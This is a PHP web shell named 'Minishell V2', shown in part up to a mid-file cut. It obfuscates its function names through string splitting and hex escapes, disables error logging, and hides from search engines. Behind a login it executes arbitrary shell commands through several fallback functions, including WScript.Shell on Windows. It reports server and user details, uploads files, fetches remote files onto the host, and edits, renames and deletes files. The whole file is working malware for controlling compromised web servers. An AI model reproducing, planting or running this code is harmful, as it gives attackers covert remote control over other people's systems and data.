<?php

session_start();
set_time_limit(0);
error_reporting(0);
@ini_set('\x65\x72\x72\x6f\x72\x5f\x6c\x6f\x67', null);
@ini_set('\x6c\x6f\x67\x5f\x65\x72\x72\x6f\x72\x73', 0);
@ini_set('\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x5f\x74\x69\x6d\x65', 0);
@ini_set('\x6f\x75\x74\x70\x75\x74\x5f\x62\x75\x66\x66\x65\x72\x69\x6e\x67', 0);
@ini_set('\x64\x69\x73\x70\x6c\x61\x79\x5f\x65\x72\x72\x6f\x72\x73', 0);
date_default_timezone_set('\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61');
header("X-XSS-Protection: 0");
//--------------------------//
$hayoloh = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
$func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
$f_exist = "fil" . "e_exi" . "sts";
$f_size = "fi" . "les" . "ize";
$r_file = "re" . "ad" . "fi" . "le";
$rnd = 'ro' . 'un' . 'd';
$f_time = 'fi' . 'l' . 'em' . 'ti' . 'm' . 'e';
$str_time = 's' . 'tr' . 'to' . 'ti' . 'me';
$b_name = "ba" . "sena" . "me";
$glb = 'g' . 'l' . 'o' . 'b';
$is_d = 'is' . '_' . 'd' . 'i' . 'r';
$is_f = 'is' . '_' . 'f' . 'i' . 'l' . 'e';
$unl = 'u' . 'n' . 'l' . 'i' . 'n' . 'k';
$rm_d = 'r' . 'm' . 'd' . 'i' . 'r';
$cr_ea_teF_old_er = "mk" . "d" . "ir";
$tch = 't' . 'ou' . 'c' . 'h';
$fo = 'fo' . 'p' . 'e' . 'n';
$fw = 'f' . 'wr' . 'it' . 'e';
$fc = 'f' . 'cl' . 'os' . 'e';
$fr = 'f' . 're' . 'a' . 'd';
$f_get = 'f' . 'il' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'co' . 'nten' . 't' . 's';
$f_put = 'f' . 'il' . 'e' . '_' . 'pu' . 't' . '_' . 'co' . 'n' . 'te' . 'nt' . 's';
$is_rsrc = 'is' . '_' . 're' . 'so' . 'ur' . 'ce';
$sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
$proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
$proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
$pop = 'p' . 'ope' . 'n';
$pop_cls = 'pc' . 'lose';
$exc = 'e' . 'x' . 'ec';
$sys = 's' . 'ys' . 't' . 'em';
$pass = 'pa' . 's' . 'sth' . 'ru';
$sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
$com = 'C' . 'O' . 'M';
$wscsh = 'WS' . 'cr' . 'ipt' . '.' . 'S' . 'he' . 'll';
$cMdexe = 'c' . 'md' . '.' . 'e' . 'x' . 'e';
$preg = 'pr' . 'eg_' . 'mat' . 'ch';
$regex = '2' . '>' . '&' . '1';
$gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e';
$b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de';
$nelrts = 's' . 'tr' . 'l' . 'en';
$rhc = 'c' . 'h' . 'r';
$dro = 'o' . 'r' . 'd';
$f_perm = 'f' . 'il' . 'ep' . 'e' . 'r' . 'ms';
$u_n_a_me = "p" . "hp" . "_" . "un" . "ame";
$cw = "ge" . "tc" . "wd";
$d_name = 'd' . 'ir' . 'na' . 'm' . 'e';
$psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
$psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
$psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
$psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
$myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
$mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
$cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';
$own_f = 'fi' . 'le' . 'ow' . 'n' . 'er';
$grp_f = 'fi' . 'le' . 'gr' . 'ou' . 'p';
$g_host_name = 'g' . 'et' . 'ho' . 'st' . 'b' . 'yn' . 'am' . 'e';
$is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
$is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
$muv = "m" . "ove" . "_up" . "loa" . "ded_fi" . "le";
$cp = 'c' . 'op' . 'y';
$this_domain = $_SERVER['HTTP_HOST'];
$this_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$fontawesome_pro_version = 'v6.6.0';
$fontawesome_pro = 'https://kit-pro.fontawesome.com/releases/' . $fontawesome_pro_version . '/css/pro.min.css';
$sname = 'Minishell V2';
$slogo = "https://avatars.githubusercontent.com/u/110225798?s=400&u=a70f7077c8dce785ca61cb5d174fa666da082b1e&v=4";
$sicon = "https://raw.githubusercontent.com/InvisibleBunny/Records/refs/heads/main/media/bm.jpg";
//functions
function NuLzCmd($komendnya)
{
  global $hayoloh;
  global $fw;
  global $fc;
  global $fr;
  global $is_rsrc;
  global $sgc;
  global $proc;
  global $proc_cls;
  global $pop;
  global $pop_cls;
  global $exc;
  global $sys;
  global $pass;
  global $sh_exc;
  global $com;
  global $wscsh;
  global $cMdexe;
  global $func_exist;
  global $preg;
  global $regex;
  if (!$preg('/' . $regex . '/i', $komendnya)) {
    $komendnya = $komendnya . ' ' . $regex;
  }

  if ($func_exist($proc)) {
    $descriptors = [
      0 => ['pipe', 'r'],
      1 => ['pipe', 'w'],
      2 => ['pipe', 'w'],
    ];
    $process = $proc($komendnya, $descriptors, $pipes);
    if ($is_rsrc($process)) {
      $fw($pipes[0], 'input_data_here');
      $fc($pipes[0]);
      $output = $sgc($pipes[1]);
      $errors = $sgc($pipes[2]);
      $fc($pipes[1]);
      $fc($pipes[2]);
      $resultCode = $proc_cls($process);
      return trim($hayoloh(stripslashes($output)));
    }
  } elseif ($func_exist($pop)) {
    $process = $pop($komendnya, 'r');
    $read = $fr($process, 2096);
    return trim($hayoloh(stripslashes(print_r("$process: " . gettype($process) . "\n$read \n"))));
    $pop_cls($process);
  } elseif ($func_exist($exc)) {
    $exc($komendnya, $output, $returnCode);
    if ($returnCode === 0) {
      $res = implode($output);
      return trim($hayoloh(stripslashes($res)));
      ob_flush();
      flush();
    }
  } elseif ($func_exist($sys)) {
    $out = $sys($komendnya);
    return trim($hayoloh(stripslashes($out)));
  } elseif ($func_exist($pass)) {
    $out = $pass($komendnya);
    return trim($hayoloh(stripslashes($out)));
  } elseif ($func_exist($sh_exc)) {
    $out = $sh_exc($komendnya);
    return trim($hayoloh(stripslashes($out)));
  } elseif ($func_exist($com)) {
    $shell = new $com($wscsh);
    $kom_mand = "$cMdexe /c " . $komendnya;
    $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
    return trim($hayoloh(stripslashes($output)));
  } else {
    return 'The F' . 'un' . 'ct' . 'io' . 'n T' . 'o R' . 'u' . 'n The C' . 'om' . 'ma' . 'nd I' . 's Di' . 'sa' . 'bl' . 'e On T' . 'h' . 'is Se' . 'rv' . 'er';
  }
}
if (isset($_POST['nulz'])) {
  $komendnya = $_POST['nulz'];
  echo NuLzCmd($komendnya);
}
function bunvisUpload($this_file, $location)
{
  global $func_exist;
  global $muv;
  global $cp;
  if ($func_exist($muv)) {
    if ($muv($this_file, $location)) {
      return true;
    } else {
      return false;
    }
  } elseif ($func_exist($cp)) {
    if ($cp($this_file, $location)) {
      return true;
    } else {
      return false;
    }
  } else {
    return false;
  }
}
function NuLzReadFile($this_file)
{
  global $hayoloh;
  global $func_exist;
  global $f_get;
  global $fo;
  global $fr;
  global $fc;
  $cantread = 'Cant Not Read ' . $this_file;
  $content = '';

  if ($func_exist($fo)) {
    $fi_le = $fo($this_file, 'r');
    if ($fi_le) {
      while (!feof($fi_le)) {
        $content .= $fr($fi_le, 8192);
      }
      $fc($fi_le);
      return $content;
    } else {
      echo $cantread;
      return false;
    }
  } elseif ($func_exist($f_get)) {
    $content = $f_get($this_file);
    if ($content) {
      $headers = get_headers($this_file);
      if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
        $content = NuLzCmd('cat "' . addslashes($this_file) . '"');
      }
      return $content;
    } else {
      echo $cantread;
      return false;
    }
  } else {
    echo $cantread;
    return false;
  }
}
function NuLzSaveFile($this_file, $filecontent)
{
  global $func_exist;
  global $f_put;
  global $fo;
  global $fw;
  global $fr;
  global $fc;
  if ($func_exist($fo)) {
    $editfi_le1 = $fo($this_file, 'w');
    if ($fw($editfi_le1, $filecontent)) {
      return true;
    } else {
      return false;
    }
  } elseif ($func_exist($f_put)) {
    $editfi_le2 = $f_put($this_file, $filecontent);
    if ($editfi_le2 === false) {
      return false;
    } else {
      return true;
    }
  } else {
    return false;
  }
}
function NuLzPerms($value)
{
  global $f_perm;
  $perms = $f_perm($value);
  if (($perms & 0xC000) == 0xC000) {
    $info = 's';
  } elseif (($perms & 0xA000) == 0xA000) {
    $info = 'l';
  } elseif (($perms & 0x8000) == 0x8000) {
    $info = '-';
  } elseif (($perms & 0x6000) == 0x6000) {
    $info = 'b';
  } elseif (($perms & 0x4000) == 0x4000) {
    $info = 'd';
  } elseif (($perms & 0x2000) == 0x2000) {
    $info = 'c';
  } elseif (($perms & 0x1000) == 0x1000) {
    $info = 'p';
  } else {
    $info = 'u';
  }
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
  // return $info;
  return $info . '&nbsp;<font class="text-white font-bold">&gt;&gt;</font>&nbsp;' . substr(sprintf('%o', $perms), -4);
}
function ChangePerms($value)
{
  global $f_perm;
  $perms = $f_perm($value);
  return substr(sprintf('%o', $perms), -4);
}
function NuLzUname()
{
  global $func_exist;
  global $u_n_a_me;
  $u_n_a_me_disable = '<font style="color: #ff0000"> Ca' . 'nt' . ' R' . 'ea' . 'd Th' . 'e Ke' . 'rn' . 'el' . '! Th' . 'e F' . 'u' . 'nc' . 'ti' . 'o' . 'n ' . $u_n_a_me . '() is Di' . 'sa' . 'bl' . 'ed' . '! </font>';
  $u_n_a_me_active = '<font style="color: #ffd53b">' . $u_n_a_me('a') . '</font>';
  if ($func_exist($u_n_a_me)) {
    return $u_n_a_me_active;
  } else {
    return $u_n_a_me_disable;
  }
}
function NuLzCwd()
{
  global $cw;
  global $func_exist;
  global $d_name;
  if ($func_exist($cw)) {
    return @$cw();
  } else {
    return $d_name($_SERVER["SCRIPT_FILENAME"]);
  }
}
function serverIp()
{
  global $func_exist;
  global $g_host_name;
  $serverAddr = @$_SERVER["SERVER_ADDR"];
  if (!$serverAddr) {
    if ($func_exist($g_host_name)) {
      return @$g_host_name($_SERVER['SERVER_NAME']);
    } else {
      return '????';
    }
  } else {
    return $serverAddr;
  }
}
function userIp()
{
  return @$_SERVER["REMOTE_ADDR"];
}
if (@ini_get('\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73'))
  $cekFunc = '<font style="color: #ffff00">' . @ini_get('\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73') . '</font>';
else
  $cekFunc = '<font style="color: #ffd53b">All F' . 'un' . 'ct' . 'io' . 'n' . 's Ac' . 'ces' . 'sib' . 'le' . '</font>';
if (!$func_exist($psx_egid)) {
  $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
  $uid = $func_exist($myuid) ? @$myuid() : "????";
  $gid = $func_exist($mygid) ? @$mygid() : "????";
  $group = "?";
} else {
  $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$psx_usr_uid($psx_euid()) : array("name" => "????", "uid" => "????");
  $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$psx_grp_gid($psx_egid()) : array("name" => "????", "gid" => "????");
  $user = $uid['name'];
  $uid = $uid['uid'];
  $group = $gid['name'];
  $gid = $gid['gid'];
}
//login
define('THIS_USER', '$2a$12$dsAbnBVcst4XCvcv0wCPvOnVx6xHuoS3/YUfK2VBnhWasI4t/QoGK');
define('THIS_PASS', '$2a$12$grbsz4686GdPSyjQD/WJHuK9T05.dhDws4sM0DrU3Z/bzL8uBq1SK');
$my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
if (isset($_POST['btn-login'])) {
  $username = $_POST['username'];
  $password = $_POST['password'];
  if (password_verify($username, THIS_USER)) {
    if (password_verify($password, THIS_PASS)) {
      $isSecure = false;
      if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
        $isSecure = true;
      } elseif (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        $isSecure = true;
      } elseif (!empty($_SERVER['HTTP_X_FORWARDED_SSL']) && $_SERVER['HTTP_X_FORWARDED_SSL'] === 'on') {
        $isSecure = true;
      }
      $_SESSION["youngbunny"] = "youngbunny";
      setcookie($username . '-youngbunnyman', $my_self, time() + (3600 * 24), "/", "", $isSecure, true);
    } else {
      echo '<script>
                alert("Password Salah!");
            </script>';
    }
  } else {
    echo '<script>
                alert("Username atau Password Salah!");
            </script>';
  }
}
if (isset($_GET['logout'])) {
  $_SESSION = [];
  session_unset();
  session_destroy();
  setcookie('youngbunnyman', '', time() - 3600);
  echo "<s" . "c" . "ri" . "pt" . ">" . "window.location.assign('" . $_SERVER['PHP_SELF'] . "')" . "</" . "sc" . "ri" . "pt" . ">";
  exit();
}
if (empty($_SESSION['youngbunny'])) {
  if (empty($_COOKIE['youngbunnyman'])) {
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
      <title>.:<?= $sname ?>:. Login</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="robots" content="noindex, nofollow">
      <meta name="googlebot" content="noindex, nofollow" />
      <meta name="bingbot" content="noindex, nofollow">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/loginv2.css">
    </head>

    <body>
      <section>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>

        <div class="signin">
          <div class="content">
            <form action="" method="post" enctype="multipart/form-data">
              <h2 style="padding: 10px;">.:: <?= $sname ?> ::.</h2>
              <div class="form">
                <div class="inputBox">
                  <input type="text" name="username" required>
                  <i>Username</i>
                </div>
                <div class="inputBox">
                  <input type="password" name="password" required>
                  <i>Password</i>
                </div>
                <div class="inputBox">
                  <button type="submit" name="btn-login">Login</button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </section>
    </body>

    </html>
<?php
    exit();
  }
}
//end login
if (isset($_GET['g4jah'])) {
  $lokasi = $_GET['g4jah'];
  chdir($_GET['g4jah']);
} else {
  $lokasi = NuLzCwd();
}
$lokasi = str_replace("\\", "/", $lokasi);
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <title>.:<?= $sname ?>:.</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=1024" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow" />
  <meta name="bingbot" content="noindex, nofollow" />
  <link rel="shortcut icon" href="<?= $sicon ?>" type="image/x-icon" />
  <link rel="stylesheet" href="<?= $fontawesome_pro ?>">
  <script>
    function isDesktop() {
      return window.innerWidth >= 1024;
    }
    if (isDesktop()) {
      document.getElementById('viewport').setAttribute('content', 'width=1024');
    }
  </script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/InvisibleBunny/uikit-framework/css/mainv2.css">
</head>

<body>
  <div class="atas">
    <div class="gambar-atas">
      <img src="<?= $slogo ?>" style="width: 100px" alt="18+ Shell">
      <span><?= $sname ?></span>
    </div>
    <div class="info-atas">
      <span><?= 'S' . 'ER' . 'V' . 'ER' ?> : <strong><?= NuLzUname(); ?></strong></span>
      <span><?= 'USER' ?> : <strong style="color: #ffd53b">uid=<?= $uid ?>(<?= $user ?>)&nbsp;gid=<?= $gid ?>(<?= $group ?>)</strong></span>
      <span><?= 'SE' . 'R' . 'VE' . 'R I' . 'P ' ?> : <strong style="color: #ffd53b"><?= serverIp(); ?></strong></span>
      <span><?= 'U' . 'SE' . 'R I' . 'P' ?> : <strong style="color: #ffd53b"><?= userIp(); ?></strong></span>
      <span><?= 'D' . 'IS' . 'ABL' . 'E FU' . 'NC' . 'TI' . 'ON' ?> : <strong><?= $cekFunc ?></strong></span>
      <span><?= 'SO' . 'FT' . 'WA' . 'RE' ?> : <strong style="color: #ffd53b"><?= $_SERVER['SERVER_SOFTWARE'] ?></strong></span>
    </div>
  </div>
  <hr style="margin: 1em;">
  <div style="font-size: calc(5px + 1vw);" class="lokasi coll">
    <?php
    $pa_t_hs = explode("/", $lokasi);
    echo '<span style="font-weight: 700;"><i class="fa-duotone fa-folder-tree"></i>&nbsp;&nbsp;PWD: ';
    echo '<a style="color: #ff0000;" href="?g4jah=/"><i class="fa-sharp fa-solid fa-slash-forward"></i></a>';
    foreach ($pa_t_hs as $id => $pat) {
      echo "<a class='namadir' href='?g4jah=";
      for ($i = 0; $i <= $id; $i++) {
        echo $pa_t_hs[$i];
        if ($i != $id) {
          echo '/';
        }
      }
      echo "'>$pat</a><span style='color: #ff0000;'>/</span>";
    }
    echo "&nbsp;&nbsp;<span style='color: #ff0000;'>[ <a href='" . $_SERVER['PHP_SELF'] . "' class='home_sh_e_ll'><font class='home_sh_e_ll'>Ho" . "me" . " " . "Sh" . "el" . "l</font></a> ]</span>";
    echo '</span>';
    ?>
  </div>
  <hr style="margin: 1em;">
  <div class="coll">
    <form action="" method="post" id="form-upload" class="form-upload">
      <div class="coll file-upload-wrapper">
        <label for="bunvisup" class="file-upload-label" style="font-weight: 700;"><i class="fa-sharp fa-solid fa-file-arrow-up fa-fade"></i>&nbsp;<?= 'UP' . 'LO' . 'AD F' . 'IL' . 'E' ?></label>
        <input type="file" name="bunvisup[]" id="bunvisup" multiple>
      </div>
    </form>
  </div>
  <form action="" method="post" id="form-tools" class="form-tools">
    <div class="form-container news-files" style="display: none;">
      <input type="text" name="newfiles" id="newfiles" placeholder="NewFiles.txt">
      <button type="button" id="btn-newfiles" class="btn-newfiles">Create File</button>
    </div>
    <div class="form-container news-dirs" style="display: none;">
      <input type="text" name="newdirs" id="newdirs" placeholder="New Folder">
      <button type="button" id="btn-newdirs">Create Folder</button>
    </div>
    <div class="form-container remote-upload" style="display: none;">
      <input type="text" name="fileurl" id="fileurl" placeholder="https://url.com/file.txt">
      <input type="text" name="savename" id="savename" placeholder="saved.txt">
      <button type="button" id="btn-upload-remote">Upload</button>
    </div>
    <div class="terminal coll">
      <div>
        <input type="text" name="command" id="command" placeholder="ls -la">
        <button type="submit" name="btn-command" id="btn-command" value="submit">enter</button>
      </div>
      <?php
      if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['btn-command']) && $_POST['btn-command']) {
          $cmd = $_POST['command'];
      ?>
          <textarea style="width: 80%; background: transparent; border: 1px solid #eaeaea; color: #05b07d; padding: 5px;" class="output-cmd" rows="30" readonly><?= NuLzCmd($cmd) ?></textarea>
      <?php
        }
      }
      ?>
    </div>
    <div>
      <button type="button" class="btn-tools" id="btn-news-file"><i class="fa-solid fa-file-plus"></i>&nbsp;NEW FILE</button>
      <button type="button" class="btn-tools" id="btn-news-dir"><i class="fa-sharp fa-solid fa-folder-plus"></i>&nbsp;NEW DIRS</butt>
        <button type="button" class="btn-tools" id="btn-remote-upload"><i class="fa-solid fa-laptop-arrow-down"></i>&nbsp;Remote Upload</butt>
    </div>
  </form>
  <hr style="margin: 1em;">
  <?php
  function createFile($filename, $filecontent)
  {
    global $func_exist;
    global $fo;
    global $fw;
    global $fc;
    global $f_put;
    global $tch;
    if (empty($filename)) {
      return false;
    }

    if ($func_exist($fo)) {
      $c_r_e_a_t_e_f_i_l_e_1 = $fo($filename, 'w');
      if ($c_r_e_a_t_e_f_i_l_e_1 === false) {
        $c_r_e_a_t_e_f_i_l_e_2 = $f_put($filename, $filecontent);
        if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
          $c_r_e_a_t_e_f_i_l_e_3 = $tch($filename);
          if ($c_r_e_a_t_e_f_i_l_e_3 === false) {
            return false;
          } else {
            return true;
          }
        } else {
          return true;
        }
      } else {
        if ($fw($c_r_e_a_t_e_f_i_l_e_1, $filecontent) === false) {
          return false;
        } else {
          return true;
          $fc($c_r_e_a_t_e_f_i_l_e_1);
        }
        $fc($c_r_e_a_t_e_f_i_l_e_1);
      }
    } elseif ($func_exist($f_put)) {
      $c_r_e_a_t_e_f_i_l_e_2 = $f_put($filename, "");
      if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
        return false;
      } else {
        return true;
      }
    }
  }
  function renameItem($oldName, $newName)
  {
    global $lokasi;
    $oldPath = $lokasi . '/' . $oldName;
    $newPath = $lokasi . '/' . $newName;
    if (!file_exists($oldPath)) {
      return false;
    }
    if (file_exists($newPath)) {
      return false;
    }
    if (rename($oldPath, $newPath)) {
      return true;
    } else {
      return false;
    }
  }

  function deleteDir($dirName)
  {
    global $f_exist;
    global $glb;
    global $is_d;
    global $unl;
    global $rm_d;
    if (!$f_exist($dirName)) {
      return false;
    }
    $files = $glb($dirName . '/*');
    foreach ($files as $file) {
      $is_d($file) ? deleteDir($file) : $unl($file);
    }
    $rm_d($dirName);
    return true;
  }

  function deleteFile($fileName)
  {
    global $f_exist;
    global $unl;
    if ($f_exist($fileName)) {
      if ($unl($fileName)) {
        return true;
      } else {
        return false;
      }
    } else {
      return false;
    }
  }

  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    //upload
    if (isset($_FILES["bunvisup"])) {
      $countFiles = count($_FILES["bunvisup"]["name"]);
      for ($i = 0; $i < $countFiles; $i++) {
        $fi_le_Na_me = $_FILES["bunvisup"]["name"][$i];
        $location = "" . $fi_le_Na_me;

        if (bunvisUpload($_FILES["bunvisup"]["tmp_name"][$i], $location)) {
          echo '<div class="coll"><span>Fi' . 'le => <a style="color: #ffd53b;" href="' . $fi_le_Na_me . '" target="_blank">' . $fi_le_Na_me . '</a> Su' . 'cc' . 'es' . 's Up' . 'lo' . 'a' . 'de' . 'd</span></div>';
        } else {
          echo '<div class="coll"><span>Fi' . 'le => <font style="color: #ff0000;">' . $fi_le_Na_me . '</font> Fa' . 'il' . 'ed ' . 'To' . ' U' . 'pl' . 'oa' . 'd</span></div>';
        }
      }
    }
    //end upload
    //new file
    if (isset($_POST['action']) && $_POST['action'] === 'newfiles' && isset($_POST['fileName'])) {
      $fileName = $_POST['fileName'];
      $filecontent = '';

      if (createFile($fileName, $filecontent)) {
        echo '<script>
                    alert("File ' . $fileName . ' is Created.")
                </script>';
      } else {
        echo '<script>
                    alert("Failed To Create ' . $fileName . '")
                </script>';
      }
    }
    //end new file
    //new folder
    if (isset($_POST['action']) && $_POST['action'] === 'newdirs' && isset($_POST['dirName'])) {
      $dirName = $_POST['dirName'];

      if ($cr_ea_teF_old_er($dirName)) {
        echo '<script>
                    alert("Folder ' . $dirName . ' is Created.")
                </script>';
      } else {
        echo '<script>
                    alert("Failed To Create ' . $dirName . '")
                </script>';
      }
    }
    //end new folder
    //remote upload
    if (isset($_POST['action']) && $_POST['action'] === 'remote-upload' && isset($_POST['fileUrl']) && isset($_POST['saveName'])) {
      $fileUrl = $_POST['fileUrl'];
      $saveName = $_POST['saveName'];
      $filecontent = $f_get($fileUrl);

      if (!empty($fileUrl) && !empty($saveName)) {
        if ($filecontent !== false) {
          if (createFile($saveName, $filecontent)) {
            return true;
          } else {
            return false;
          }
        } else {
          return false;
        }
      } else {
        return false;
      }
    }
    //end remote upload
    //save file
    if (isset($_POST['savefile'])) {
      $fileName = $_POST['filename'];
      $filePath = $lokasi . '/' . $fileName;
      $fileContent = $_POST['filecontent'];
      if (NuLzSaveFile($filePath, $fileContent)) {
        echo '<script>
                    alert("File Saved.")
                </script>';
      } else {
        echo '<script>
                    alert("File Failed To Save.")
                </script>';
      }
    }
    //end save file
    //editfile
    if (isset($_POST['editfile'])) {
      $fileName = $_POST['file'];
      $filePath = $lokasi . '/' . $fileName;
      if (file_exists($filePath)) {
        $filecontent = $hayoloh(NuLzReadFile($filePath));
        echo '
                <form action="" method="post">
                    <div id="myModal" class="myModal">
                        <div class="myModal-content">
                            <span class="close-modal"><i class="fa-sharp fa-solid fa-xmark-large fa-beat-fade"></i></span>
                            <span>EDIT FILE<br>' . $filePath . '</span><br><br>
                            <button type="submit" name="savefile" style="padding: 15px 30px 15px 30px; font-weight: 700; font-size: calc(5px + 1vw);">SAVE</button>
                            <textarea id="filecontent" name="filecontent" wrap="soft" spellcheck="false">' . $filecontent . '</textarea>
                            <input type="hidden" name="filename" value="' . $fileName . '">
                        </div>
                    </div>
                </form>
                ';
      } else {
        echo '<script>
                    alert("Failed To Read This File")
                </script>';
      }
    }
    //end editfile
    //rename
    if (isset($_POST['action']) && $_POST['action'] === 'rename' && isset($_POST['oldName']) && isset($_POST['newName'])) {
      $oldName = $_POST['oldName'];
      $newName = $_POST['newName'];
      $result = renameItem($oldName, $newName);
      //echo $result;
      if ($result) {
        echo '<script>
                    alert("Rename Success")
                </script>';
      } else {
        echo '<script>
